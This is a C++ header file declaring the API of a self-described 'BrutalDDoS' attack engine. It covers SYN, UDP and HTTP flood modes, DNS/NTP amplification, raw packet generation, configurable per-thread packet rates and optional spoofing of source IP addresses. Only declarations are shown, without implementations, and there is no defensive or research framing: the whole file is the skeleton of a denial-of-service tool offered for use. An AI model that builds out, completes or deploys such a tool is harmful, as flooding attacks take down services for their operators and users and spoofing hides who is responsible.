/*
 * BrutalDDoS_API.h
 * Version: 1.0.0
 * Description: High-performance DDoS attack engine exported API.
 * Features: SYN, UDP, HTTP Flood, DNS/NTP Amplification, Async I/O, Config-driven.
 * Compiler: C++17 or higher
 * Dependencies: nlohmann/json (for config), spdlog (optional, included in utils)
 */

#pragma once

#ifndef BRUTAL_DDOS_API_H
#define BRUTAL_DDOS_API_H

#include <cstdint>
#include <string>
#include <string_view>
#include <vector>
#include <memory>
#include <functional>
#include <thread>
#include <atomic>
#include <mutex>
#include <map>
#include <chrono>

// --- Platform Detection ---
#if defined(_WIN32) || defined(_WIN64)
    #define BRUTAL_OS_WINDOWS 1
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #define BRUTAL_OS_LINUX 1
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <sys/epoll.h>
#endif

// --- Forward Declarations ---
namespace brutal {

enum class AttackMode : uint8_t {
    SYN = 1,
    UDP,
    HTTP_GET,
    HTTP_POST,
    DNS_AMPLIFICATION,
    NTP_AMPLIFICATION,
    ALL // Combines all modes
};

enum class LogLevel {
    DEBUG,
    INFO,
    WARNING,
    ERROR
};

struct AttackConfig {
    std::string target_ip;
    uint16_t target_port = 80;
    AttackMode mode = AttackMode::ALL;
    
    // Performance Tuning
    int thread_count = 16;
    uint64_t syn_rate_per_thread = 50000; // Packets per second
    uint64_t udp_bandwidth_mbps = 500;    // Bandwidth cap
    uint64_t http_rps = 2000;             // Requests per second
    
    // Payload Details
    std::string http_method = "POST";
    size_t payload_size_kb = 4;           // KB
    bool verbose = true;
    
    // Optional: Spoofing
    bool spoof_ip = false;
    std::string spoof_range_start = "10.0.0.0";
    std::string spoof_range_end = "10.255.255.255";
};

struct AttackStats {
    uint64_t total_packets_sent = 0;
    uint64_t bytes_sent = 0;
    uint64_t errors = 0;
    double elapsed_seconds = 0.0;
    double current_pps = 0.0;
    double current_bps = 0.0;
};

// --- Callback Types ---
using ProgressCallback = std::function<void(const AttackStats& stats)>;
using LogCallback = std::function<void(LogLevel level, const std::string& message)>;

// --- Core Engine Interface ---
class DDoSEngine {
public:
    DDoSEngine();
    ~DDoSEngine();

    // Prevent copying
    DDoSEngine(const DDoSEngine&) = delete;
    DDoSEngine& operator=(const DDoSEngine&) = delete;

    /**
     * Initialize the engine with configuration.
     * @param config The attack parameters.
     * @return true if initialization succeeded (sockets created, threads spawned).
     */
    bool initialize(const AttackConfig& config);

    /**
     * Start the attack. This is non-blocking if run_async is true.
     * @param duration_ms Duration to run (-1 for infinite).
     * @param on_progress Optional callback for real-time stats.
     * @return true if attack started successfully.
     */
    bool start(uint64_t duration_ms = -1, 
               ProgressCallback on_progress = nullptr,
               LogCallback on_log = nullptr);

    /**
     * Stop the attack gracefully.
     */
    void stop();

    /**
     * Get current live statistics.
     */
    AttackStats getStats() const;

    /**
     * Reconfigure running attack (e.g., change RPS on the fly).
     */
    bool updateConfig(const AttackConfig& new_config);

private:
    struct Impl;
    std::unique_ptr<Impl> pImpl;
};

// --- Utility Classes (Included for completeness) ---

class Logger {
public:
    static void setLevel(LogLevel level);
    static void log(LogLevel level, const std::string& msg);
    static void logColor(LogLevel level, const std::string& msg); // ANSI colors
};

class PacketGenerator {
public:
    /**
     * Generate a raw TCP SYN packet.
     * @param src_ip Source IP (or spoofed)
     * @param dst_ip Destination IP
     * @param src_port Source port
     * @param dst_port Destination port
     * @param seq_seq Sequence number
     * @return Raw packet data as string/vector
     */
    static std::vector<uint8_t> generateSynPacket(
        const std::string& src_ip, 
        const std::string& dst_ip, 
        uint16_t src_port, 
        uint16_t dst_port, 
        uint32_t seq
    );

    /**
     * Generate a UDP packet with arbitrary payload.
     */
    static std::vector<uint8_t> generateUdpPacket(
        const std::string& src_ip,
        const std::string& dst_ip,
        uint16_t src_port,
        uint16_t dst_port,
        const std::string& payload
    );

    /**
     * Generate a valid HTTP GET request.
     */
    static std::string generateHttpGetRequest(
        const std::string& host,
        uint16_t port,
        const std::string& path = "/",
        const std::string& user_agent = "Mozilla/5.0"
    );

    /**
     * Generate a valid HTTP POST request with body.
     */
    static std::string generateHttpPostRequest(
        const std::string& host,
        uint16_t port,
        const std::string& path = "/",
        const std::string& content_type = "application/x-www-form-urlencoded",
        const std::string& body = ""
    );
};

class SocketManager {
public:
    /**
     * Create a raw socket for SYN flood (requires root/admin).
     */
    static int createRawSocket();

    /**
     * Create a standard UDP/TCP socket.
     */
    static int createStreamSocket();

    /**
     * Set socket options (TTL, TTL, Non-blocking).
     */
    static bool setSocketOptions(int fd, bool non_blocking = true, uint8_t ttl = 64);
};

} // namespace brutal

#endif // BRUTAL_DDOS_API_H
